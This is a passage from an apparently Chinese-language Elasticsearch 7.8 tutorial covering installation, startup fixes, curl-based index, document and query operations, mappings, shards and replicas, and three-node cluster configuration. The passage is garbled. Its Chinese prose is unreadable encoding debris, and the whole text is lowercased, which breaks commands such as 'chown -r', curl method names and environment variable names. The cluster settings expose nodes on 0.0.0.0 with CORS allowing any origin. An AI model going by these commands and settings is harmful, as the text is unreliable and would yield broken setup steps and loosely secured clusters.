¥å°æä¸ªéç¾¤ãåªæå¨åä¸å°æå¡å¨ä¸è¿è¡çèç¹æä¼èªå¨ç»æéç¾¤ã\n\nå¦æåºç°æªè¢«ååºçå¯æ¬ï¼åéç¾¤ç¶æä¼æ¯ï¼yellowï¼ï¼å¹¶ä¸ä»£è¡¨ä¸å¥åº·ï¼åªæ¯è¿äºå¯æ¬æ²¡æè¢«ææçåéåä½¿ç¨ï¼æä»¬å¯ä»¥æ ¹æ®æä»¬çå¯æ¬æ°éæ¥æ©å±æå¡å¨ï¼æ°å¯å¨çèç¹ä¼ç«é©¬è¢«å®æååäº«æåçåå¯æ¬æ°æ®ï¼å·²è¾¾å°æ¯ä¸ªåçåå¯æ¬å¨ä¸åçèç¹ã\n\nå½éç¾¤ä¸­è¿çä¸»èç¹æéï¼ä¼ä»éç¾¤ä¸­éåä¸ä¸ªèç¹ä¸ºä¸»èç¹ï¼å¹¶ä¸åçä¹ä¸ºä¸»åçï¼ææçåæä½ä¹é½ä¼è¿å¥å°è¿ä¸ªèç¹ã',normalizedContent:'# åºç¡æ¦å¿µ\n\n * ç´¢å¼ï¼indexï¼\n   es çç´¢å¼ç±»ä¼¼äº mysql çåº\n * ç±»åï¼typeï¼\n   å¨ä¸ä¸ªç´¢å¼ä¸­å¯ä»¥æä¸ä¸ªæå¤ä¸ªç±»åï¼éå¸¸ä¼ä¸ºç¸åææ¡£æ ¼å¼çå½ä¸ºä¸ä¸ªç±»åï¼ä½å¨ es7.x é»è®¤ä¸å¨æ¯æç´¢å¼ç±»åçæä½ï¼ææ¡£åç´¢å¼ç´æ¥äº§çå³ç³»ã\n * ææ¡£ï¼docï¼\n   ææ¡£å°±æ¯æä»¬ç json æ°æ®ï¼ä¸ä¸ªç´¢å¼æå¤ä¸ªææ¡£\n * å­æ®µï¼fieldï¼\n   å°±æ¯ææ¡£ json ä¸­çå±æ§\n * æ å°ï¼mappingï¼\n   mysql è¡¨ä¸­ä¼æç¸å³çå­æ®µç±»åï¼æ¯å¦ä¸ºç©ºï¼é¿åº¦å¤å°ï¼æ¯å¦ç´¢å¼ï¼è¿äºå es ä¸­ç mapping ç¸ä¼¼ï¼å¯ä»¥å®ä¹ä¸ä¸ªå±æ§ï¼ä»¥åä»çç±»åï¼æ¯å¦å¯ä»¥è¢«ç´¢å¼ç­ã\n * åçï¼shardsï¼\n   es çåçç¸å½äº mysql çæ°´å¹³åè¡¨ï¼æ¯å¦ id % 5ï¼ä¸åç»æè½å°åä¸ªè¢«å®ä¹å¥½çè¡¨ä¸­ï¼å¯ä»¥æ©å±æä»¬çå­å¨å®¹éï¼æææé«æ¥è¯¢æ§è½\n * å¯æ¬ï¼replicasï¼\n   åçå¯ä»¥ææ°æ®åå¸å°åä¸ªèç¹ä¸ï¼ç»ä¸æé«æå¡ï¼å¯æä¸ªèç¹å´©æºå°±ä¼å¯¼è´æ°æ®çä¸¢å¤±ï¼å¯æ¬å°±æ¯ä¿è¯åççæ°æ®é«å¯ç¨çä¸ç§æ¹æ¡ï¼ææ°æ®å¨å¦ä¸å°æå¡å¨å¤å¶ä¸ä»½ãå¯æ¬ä¹å¯ä»¥æåä¸å®çæ§è½ï¼å ä¸ºæç´¢å¯ä»¥å¨ææçå¯æ¬ä¸å¹¶è¿è¡ã\n * åéï¼allocationï¼\n\n\n# åæºå®è£\n\nå®ç½å°åï¼https://www.elastic.co/cn/downloads/past-releases#elasticsearchï¼éè¦ç¨ä¸äºç§å­¦ææ®µï¼å¦ååå®¹å è½½ä¸å¨ï¼ä¸å¥½æ¾å°æä¹ä½ éè¦ççã\n\n# ä¸è½½\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-linux-x86_64.tar.gz\n# è§£å\ntar -xvf elasticsearch-7.8.0-linux-x86_64.tar.gz\n# å¯å¨\ncd elasticsearch-7.8.0/bin\n./elasticsearch\n# æ¥éï¼æå¾æ¯jdk8ï¼ä»éè¦jdk11\nfuture versions of elasticsearch will require java 11; your java version from [/opt/software/jdk/jre] does not meet this requirement\n\n# ä¿®æ¹eséç½®æä»¶\ncd elasticsearch-7.8.0/bin\nvim elasticsearch-env\n# æ¾å°æjava_homeçå¤æ­ï¼è®¾ç½®æ es èªå¸¦çjdkï¼å¦ä¸æ¯æç\nif [ ! -z "$java_home" ]; then\n  java="/opt/software/elasticsearch-7.8.0/jdk/bin/java"\n  java_type="java_home"\nelse\n# éæ°å¯å¨ï¼ç¶ååæ¥éï¼æææ¯ä¸è½ç¨rootè¿è¡\norg.elasticsearch.bootstrap.startupexception: java.lang.runtimeexception: can not run elasticsearch as root\n\n# åå»ºç¨æ·ï¼å¹¶èµäºæé\nadduser es\n# ä¿®æ¹esç¨æ·çå¯ç \npasswd es\n# ä¿®æ¹\nchown -r es:es elasticsearch-7.8.0/ \n# åæ¢ç¨æ·ç»å½ï¼å¯å¨ç¨åº\nsu es\n\n# å¦æéå°è¯¥ç±»æ¥é\nerror: [3] bootstrap checks failed\n[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]\n[2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]\n[3]: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured\n\n# éè¦ä¿®æ¹ä¸ä¸åæ°ï¼è¿å¥ vim /etc/security/limits.conf\n# sandwichè¡¨ç¤ºè¿è¡elasticsearchçç¨æ·ï¼hardä¸softè¡¨ç¤ºéå¶çç±»åï¼nofileè¡¨ç¤ºmax number of open file descriptorsï¼65536è¡¨ç¤ºè®¾ç½®çå¤§å°ã\n# è¿ä¸ªå¼æç»å½±åçæ¯ ulimit çopen filesçæå¤§å¼\n* hard nofile 65536\n* soft nofile 65536\n# ä¿®æ¹å¦ä¸ä¸ªæä»¶ï¼ vim /etc/sysctl.confï¼æ·»å å¦ä¸ï¼åæ§è¡ sysctl -p\nvm.max_map_count=655360\n# ä¿®æ¹ vim elasticsearch.ymlï¼éç½®è¿ç¨è®¿é®ï¼åä¿®æ¹ä»¥ä¸é®é¢\nnetwork.host: 0.0.0.0\ndiscovery.seed_hosts: ["10.240.30.93"]\ncluster.initial_master_nodes: ["master"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n> ç«¯ 9300 ç«¯å£ä¸º es éç¾¤é´ç»ä»¶çéä¿¡å£ï¼9200 ç«¯å£ä¸ºæµè§å¨è®¿é®ç http åè®® restful ç«¯å£ãå½ es å¯å¨æååæä»¬å¯ä»¥éè¿è®¿é® http://localhost:9200 æµè¯ç»æ\n\n\n# æ°æ®æ ¼å¼ç®ä»\n\nelasticsearch æ¯é¢åææ¡£åæ°æ®åºï¼ä¸æ¡æ°æ®å¨è¿éå°±æ¯ä¸ä¸ªææ¡£ãä¸ºäºæ¹ä¾¿å¤§å®¶çè§£ï¼æä»¬ elasticsearch éå­å¨ææ¡£æ°æ®åå³ç³»åæ°æ®åº mysql å­å¨æ°æ®çæ¦å¿µè¿è¡ä¸ä¸ªç±»æ¯\n\n\n\nes éç index å¯ä»¥çåä¸ä¸ªåºï¼è types ç¸å½äºè¡¨ï¼document åç¸å½äºè¡¨çè¡ãè¿é types çæ¦å¿µå·²ç»è¢«ä¸»é®å¼±åï¼es6.x ä¸­ï¼ä¸ä¸ª index ä¸å·²ç»åªè½åå«ä¸ä¸ª typeï¼es7.x ä¸­ï¼type çæ¦å¿µå·²ç»è¢«å é¤äºã\n\nå¨ mysql ä¸­ç´¢å¼æ¯å¸®å©æ¥è¯¢è¿è¡å¿«éæ£ç´¢ï¼ä½å¨ es ä¸­ä¸ºäºè½å¤åé«å¿«éåç¡®çæ¥è¯¢ï¼ä»ä½¿ç¨äº åæç´¢å¼ ï¼æåæç´¢å¼åå¯¹åºæ æ­£æç´¢å¼\n\n * æ­£æï¼æ­£åï¼ç´¢å¼ -> å¨ mysql ä¸­ï¼å¦ idï¼content ä¸¤ä¸ªå­æ®µï¼éè¿ id å¹¶èµäºä¸å®çç´¢å¼ï¼å¯ä»¥å¿«éæ£ç´¢å°è¯¥åæ»¡è¶³æ¡ä»¶çæ°æ®ï¼ä½å¦æéè¿åå®¹æ¥è¯¢åæ¯è¾éº»ç¦ï¼éè¦åæ¨¡ç³æ¥è¯¢ï¼æ¯æ¡æ°æ®é½éè¦éåï¼æçä½ä¸ï¼èä¸è¿è¦åºååå®¹çå¤§å°åç­ã\n\n      id                   content\n-------------------------------------------\n   1001                my name is zs\n   1002                my name is ls\n\n\n1\n2\n3\n4\n\n * åæç´¢å¼ -> åæç´¢å¼æ¯å®ç° âåè¯ - ææ¡£ç©éµâ çä¸ç§å·ä½å­å¨å½¢å¼ï¼éè¿åæç´¢å¼ï¼å¯ä»¥æ ¹æ®åè¯å¿«éè·ååå«è¿ä¸ªåè¯çææ¡£åè¡¨ã\n\n      keyword               id\n-------------------------------------------\n        my              1001,1002\n        ls              1002\n        zs              1001\n\n\n1\n2\n3\n4\n5\n\n\n\n# åºæ¬æä½\n\n\n# ç´¢å¼\n\n# åå»ºç´¢å¼\n\ncurl --location --request put \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n# æ¥çç´¢å¼\n\næ¥è¯¢æä¸ªç´¢å¼çä¿¡æ¯\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\næ¥çææç´¢å¼æåªäº\n\ncurl --location --request get \'http://10.240.30.93:9200/_cat/indices?v\'\n\n\n1\n\n\n# å é¤ç´¢å¼\n\ncurl --location --request delete \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n\n# ææ¡£æä½\n\n# åå»ºææ¡£\n\nåå»ºä¸ä¸ªéæºçæ id çææ¡£ï¼ç´¢å¼æ¯ test_index\n\ncurl --location --request post \'http://10.240.30.93:9200/test_index/_doc\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n   "min_position": 7,\n   "has_more_items": false,\n   "items_html": "bike",\n   "new_latent_count": 5,\n   "data": {\n      "length": 21,\n      "text": "duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n   },\n   "objarray": [\n      {\n         "class": "lower",\n         "age": 2\n      },\n      {\n         "class": "lower",\n         "age": 1\n      }\n   ]\n}â\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nåå»ºä¸ä¸ªèªå®ä¹ id ä½ 1003 çææ¡£ï¼\n\ncurl --location --request post \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "min_position": 7,\n    "has_more_items": false,\n    "items_html": "bike",\n    "new_latent_count": 5,\n    "data": {\n        "length": 21,\n        "text": "duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n    },\n    "objarray": [\n        {\n            "class": "lower",\n            "age": 2\n        },\n        {\n            "class": "lower",\n            "age": 1\n        }\n    ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# æ¥è¯¢ææ¡£\n\néè¿ id æ¥è¯¢ææ¡£\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/1003\'\n\n\n1\n\n\næ¥ç test_index ä¸çææææ¡£\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\'\n\n\n1\n\n\n# ä¿®æ¹ææ¡£\n\nå®å¨è¦çä»¥åææ¡£çåå®¹\n\n curl --location --request put \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n   "data": {\n      "length": 26,\n      "text": "excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."\n   },\n   "numericalarray": [\n      30,\n      33,\n      31,\n      20,\n      30\n   ],\n   "stringarray": [\n      "carbon",\n      "oxygen",\n      "carbon",\n      "oxygen"\n   ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nåªä¿®æ¹ææ¡£ä¸­æäºå±æ§çå¼\n\ncurl --location --request post \'http://10.240.30.93:9200/test_index/_update/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "data":{\n            "text": "1111111111"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¿ id å é¤æä¸ªææ¡£\n\ncurl --location --request delete \'http://10.240.30.93:9200/test_index/_doc/1003\' \n\n\n1\n\n\n\n# æ¡ä»¶æ¥è¯¢\n\néè¿è¯·æ±è·¯å¾æ·»å åæ°ï¼æ³¨æéå  qï¼queryï¼ æ¡ä»¶çææ\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search?q=items_html:bike\'\n\n\n1\n\n\néè¿ body ä½éå æ¡ä»¶è¿è¡æ¥è¯¢\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "items_html":"bike"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¿ body ä½å æ¡ä»¶æ¥è¯¢ç´¢å¼ä¸å¨é¨ææ¡£\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nåé¡µæ¥è¯¢ï¼from ä¸ºèµ·å§ä½ç½®ï¼size ä¸ºæ¯é¡µå¤§å°ï¼åé¡µ =ï¼from-1ï¼*sizeï¼_source å¯ä»¥æå®æä»¬éè¦æ¥è¯¢çå·ä½å±æ§å¼ï¼ç±»ä¼¼äº mysql æä»¬åªæ³çåªäºåçæ°æ®ã\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "from": 0,\n    "size": 2,\n    "_source": ["min_position"]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nå¯¹æ°æ®è¿è¡æåº\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "sort":{\n        "new_latent_count": {\n            "order": "desc"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¤æ¡ä»¶æ¥è¯¢ï¼å¦ä¸ç±»ä¼¼äº mysql and æ¡ä»¶\n\n * mustï¼æ¯ and\n * shouldï¼æ¯ or\n * fileterï¼æ¯èå´æ¥è¯¢ <<=> >=\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "must":[\n                {\n                    "match":{\n                        "items_html": "bike"\n                    }\n                },\n                {\n                    "match":{\n                        "has_more_items": false\n                    }\n                }\n\n            ]\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "filter":{\n                "range":{\n                    "data.length": {\n                        "gt": 19\n                    }\n                }\n            }\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# å¨ææ£ç´¢ & å®å¨å¹é & é«äº®æ¥è¯¢ & èåæ¥è¯¢\n\næç§åè¯æ¥è¯¢ï¼åªè¦åå«è¿ä¸ªåè¯å¨é¨æ¥è¯¢åºæ¥ï¼å¦ææ¯æ±å­çè¯ä¼ææ¯ä¸ªæ±å­æ¾è¿åæç´¢å¼ä¸­ï¼è¯¥æ¹å¼ç§°ä¸ºå¨ææ£ç´¢ãmatch æ¯å¨æå¹éï¼æ´æ¢ä¸º match_phrase åæ¯å®å¨å¹éã\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"duis"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\né«äº®æ¥è¯¢ï¼æä»¬å¯ä»¥è®¾ç½®é«äº®æ¥è®©å¹éçåå®¹è¿è¡ææ¾çæ¾ç¤º\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"duis"\n        }\n    },\n    "highlight":{\n        "fields":{\n            "data.text": {}\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nèåæ¥è¯¢ï¼å¯¹ç¸ååå®¹è¿è¡æ¬¡æ°ç»è®¡\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "aggs":{ // èåæä½\n        "min_position_count":{ // èååçåç§°ï¼å¯ä»¥éæèµ·å\n            "terms": { // åç»æä½\n                "field": "min_position" // åç»å­æ®µ\n            }\n        }\n    },\n    "size": 0 // è¡¨ç¤ºä¸æ¾ç¤ºåå§æ°æ®\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ å°å³ç³»\n\næçå±æ§å¯ä»¥åè¯æ¥è¯¢ï¼æçå±æ§ä¸è½åè¯æ¥è¯¢ï¼è¿ä¸ªåè¿æ¯ä¸åï¼æä»¬æ¯å¯ä»¥è®¾ç½®çãå¨ mysql ä¸­è¡¨çä¸ä¸ªå­æ®µçç±»åãé¿åº¦è¿äºä¿¡æ¯é½å±äºè¡¨çç»æä¿¡æ¯ï¼å¨ es ä¸­ä¹æç±»ä¼¼çæ¦å¿µï¼æä»¬ç§°ä¹ä¸ºæ å°ã\n\n# åå»ºä¸ä¸ª user ç´¢å¼\ncurl --location --request put \'http://10.240.30.93:9200/user\'\n\n# åå»ºç»æä¿¡æ¯\ncurl --location --request put \'http://10.240.30.93:9200/user/_mapping\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "properties": { // å®ä¹ç»æåä¿¡æ¯\n        // å®ä¹ä¸ä¸ªname å±æ§\n        "name": {\n            "type": "text", // nameç±»åä¸º textææ¬(å¯ä»¥è¢«åè¯)\n            "index": true // è¡¨ç¤ºè¯¥å­æ®µå¯ä»¥è¢«ç´¢å¼æ¥è¯¢\n        },\n        "sex": {\n            "type": "keyword", // è¡¨ç¤ºä¸è½è¢«åè¯ï¼éè¦å®æ´å¹é\n            "index": true // è¡¨ç¤ºè¯¥å­æ®µä½¿ç¨ç´¢å¼\n        },\n        "tel": {\n            "type": "keyword", // è¡¨ç¤ºä¸è½è¢«åè¯ï¼éè¦å®æ´å¹é\n            "index": false // è¡¨ç¤ºä¸è½è¢«ç´¢å¼\n        }\n    }\n}\'\n\n# æ¥çç»æåä¿¡æ¯\ncurl --location --request get \'http://10.240.30.93:9200/user/_mapping\' \\\n--data-raw \'\'\n\n# å¢å æ°æ®\ncurl --location --request post \'http://10.240.30.93:9200/user/_doc/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "name": "å¼ ä¸",\n    "sex": "ç·",\n    "tel": "135xxxxxx05"\n}\'\n\n# æåè¯ææçæ¥è¯¢\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "name":"å¼ "\n        }\n    }\n}\'\n\n# å¨é¨å¹éï¼sexåªå¯¹åºä»¥ä¸å¼è½æ¯ ç·ï¼å¦æå¼æ¯ ç·çï¼é£ä¹é®å¥ ç· ä¹æ¯æ¥ä¸å°çï¼å¿é¡»æ¯ç·ç\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "sex":"ç·ç"\n        }\n    }\n}\'\n\n# ä¸è½è¢«ç´¢å¼ï¼index: falseï¼ï¼ç´¢å¼è¯¥å±æ§åä¼æ¥éï¼å ä¸ºä¸è½è¢«ç´¢å¼ï¼æ¥è¯¢ï¼\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "tel":"135xxxxxx05"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n\n# åçåå¯æ¬\n\nåå»º user ç´¢å¼ï¼å¹¶ä¸ºå¶åå»º 3 ä¸ªåçï¼ä»¥ååä¸»åçé½æ 1 ä¸ªå¯æ¬\n\ncurl --location --request put \'http://10.240.30.93:9200/user\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "settings":{\n        "number_of_shards": 3, // å¯¹ç´¢å¼ä¸çææ¡£åå»º3ä¸ªåç\n        "number_of_replicas": 1 // æ¯ä¸ªä¸»åçé½æ1ä¸ªå¯æ¬\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¥è¯¢æåå»ºçç´¢å¼\n\ncurl --location --request get \'http://10.240.30.93:9200/user\' \n\n{\n    "user": {\n        "aliases": {},\n        "mappings": {},\n        "settings": {\n            "index": {\n                "creation_date": "1653730124456",\n                "number_of_shards": "3", // åç\n                "number_of_replicas": "1", // å¯æ¬\n                "uuid": "e7li_zhorhwfsnkgocy3tg",\n                "version": {\n                    "created": "7080099"\n                },\n                "provided_name": "user"\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nä¿®æ¹å¯æ¬çæ°é\n\ncurl --location --request put \'http://10.240.30.93:9200/user/_settings\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "number_of_replicas": 2\n}\'\n\n\n1\n2\n3\n4\n5\n\n\n\n# éç¾¤æ­å»º\n\nä¸ä¸ªéç¾¤æ¯ç±å¤ä¸ªæå¡å¨èç¹ç»ç»å¨ä¸èµ·ï¼å±åæææ´ä¸ªçæ°æ®ï¼å¹¶ä¸èµ·æä¾ç´¢å¼åæç´¢åè½ãä¸ä¸ª es éç¾¤æä¸ä¸ªå¯ä¸çåå­ï¼æ´ä¸ªåå­é»è®¤å°±æ¯ "elasticsearch"ãè¿ä¸ªåå­æ¯éè¦çãå ä¸ºä¸ä¸ªèç¹åªè½éè¿æå®æä¸ªéç¾¤çåå­ï¼æ¥å å¥è¿ä¸ªéç¾¤ã\n\néç¾¤ä¸­åå«å¾å¤çæå¡å¨ï¼ä¸ä¸ªèç¹å°±æ¯å¶ä¸­ä¸ä¸ªæå¡å¨ãä½ä¸ºéç¾¤çä¸é¨åï¼å®å­å¨æ°æ®ï¼åä¸éç¾¤çç´¢å¼åæç´¢åè½ã\n\nä¸ä¸ªèç¹ä¹æ¯ç±åå­æ¥æ è¯çï¼é»è®¤æåµä¸ï¼è¿ä¸ªåå­æ¯ä¸ä¸ªéæºæ¼«å¨æ¼«ç»è§è²çåå­ï¼è¿ä¸ªåå­ä¼å¨å¯å¨çæ¶åèµäºèç¹ãè¿ä¸ªåå­å¯¹äºç®¡çå·¥ä½æ¥è¯´å¾éè¦ï¼å ä¸ºå¨è¿ä¸ªç®¡çè¿ç¨ä¸­ï¼ä½ åå»ç¡®å®ç½ç»ä¸­çåªäºæå¡å¨å¯¹åºäº elasticsearch éç¾¤ä¸­çåªäºèç¹ã\n\nä¸ä¸ªèç¹å¯ä»¥éè¿éç½®éç¾¤åç§°çæ¹å¼æ¥å å¥ä¸ä¸ªæå®çéç¾¤ãé»è®¤æåµä¸ï¼æ¯ä¸ªèç¹é½ä¼è¢«å®æå å¥å°ä¸ä¸ªå«å "elasticsearch" çéç¾¤ä¸­ï¼è¿æå³çï¼å¦æä½ å¨ä½ çç½ç»ä¸­å¯å¨äºè¥å¹²ä¸ªèç¹ï¼å¹¶åå®ä»ä»¬è½å¤ç¸äºåç°å½¼æ­¤ï¼ä»ä»¬å°ä¼èªå¨å½¢æå¹¶å å¥å°ä¸ä¸ªå«å "elasticsearch" çéç¾¤ä¸­ã\n\n# node1 ä¿®æ¹ elasticsearch.yml\ncluster.name: elasticsearch-1 # æå®éç¾¤çåç§°\nnode.name: node1 # æå®èç¹çåç§°\nnode.master: true # è®©è¯¥èç¹ä½ä¸ºä¸»èç¹\nnode.data: true # è®©è¯¥èç¹ä½ä¸ºæ°æ®èç¹\nnetwork.host: node1 # æå®æ¬æºçipï¼æçå¨ hostä¸­åä¸ªæ å°\nhttp.port: 9200 # http è¯·æ±å°å\ntransport.tcp.port: 9300 # éç¾¤éä¿¡ç«¯å£\nhttp.cors.enabled: true # è·¨åéç½®\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # åæ¡æ°æ®æå¤§åå®¹ä¸º200mbçæ°æ®\n\ncluster.initial_master_nodes: ["node1"] # es7.xä¹åæ°å¢çéç½®ï¼åå§åä¸ªæ°çéç¾¤æ¶éè¦æ­¤éç½®æ¥éä¸¾master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # èç¹åç°\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # éç¾¤ååæ¶å¯å¨çæ°æ®ä»»å¡ä¸ªæ°ï¼é»è®¤æ¯2ä¸ª\ncluster.routing.allocation.node_concurrent_recoveries: 16 # æ·»å æå é¤èç¹åè´è½½åè¡¡æ¶å¹¶åæ¢å¤ççº¿ç¨ä¸ªæ°ï¼é»è®¤4ä¸ª\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # åå§åæ°æ®æ¢å¤æ¶ï¼å¹¶åæ¢å¤çº¿ç¨çä¸ªæ°ï¼é»è®¤4ä¸ª\n\n# node2 ä¿®æ¹ elasticsearch.yml\ncluster.name: elasticsearch-1 # æå®éç¾¤çåç§°\nnode.name: node2 # æå®èç¹çåç§°\nnode.master: true # è®©è¯¥èç¹ä½ä¸ºä¸»èç¹\nnode.data: true # è®©è¯¥èç¹ä½ä¸ºæ°æ®èç¹\nnetwork.host: node2 # æå®æ¬æºçipï¼æçå¨ hostä¸­åä¸ªæ å°\nhttp.port: 9200 # http è¯·æ±å°å\ntransport.tcp.port: 9300 # éç¾¤éä¿¡ç«¯å£\nhttp.cors.enabled: true # è·¨åéç½®\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # åæ¡æ°æ®æå¤§åå®¹ä¸º200mbçæ°æ®\n\ncluster.initial_master_nodes: ["node1"] # es7.xä¹åæ°å¢çéç½®ï¼åå§åä¸ªæ°çéç¾¤æ¶éè¦æ­¤éç½®æ¥éä¸¾master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # èç¹åç°\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # éç¾¤ååæ¶å¯å¨çæ°æ®ä»»å¡ä¸ªæ°ï¼é»è®¤æ¯2ä¸ª\ncluster.routing.allocation.node_concurrent_recoveries: 16 # æ·»å æå é¤èç¹åè´è½½åè¡¡æ¶å¹¶åæ¢å¤ççº¿ç¨ä¸ªæ°ï¼é»è®¤4ä¸ª\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # åå§åæ°æ®æ¢å¤æ¶ï¼å¹¶åæ¢å¤çº¿ç¨çä¸ªæ°ï¼é»è®¤4ä¸ª\n\n\n# node3 ä¿®æ¹ elasticsearch.yml\ncluster.name: elasticsearch-1 # æå®éç¾¤çåç§°\nnode.name: node3 # æå®èç¹çåç§°\nnode.master: true # è®©è¯¥èç¹ä½ä¸ºä¸»èç¹\nnode.data: true # è®©è¯¥èç¹ä½ä¸ºæ°æ®èç¹\nnetwork.host: node3 # æå®æ¬æºçipï¼æçå¨ hostä¸­åä¸ªæ å°\nhttp.port: 9200 # http è¯·æ±å°å\ntransport.tcp.port: 9300 # éç¾¤éä¿¡ç«¯å£\nhttp.cors.enabled: true # è·¨åéç½®\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # åæ¡æ°æ®æå¤§åå®¹ä¸º200mbçæ°æ®\n\ncluster.initial_master_nodes: ["node1"] # es7.xä¹åæ°å¢çé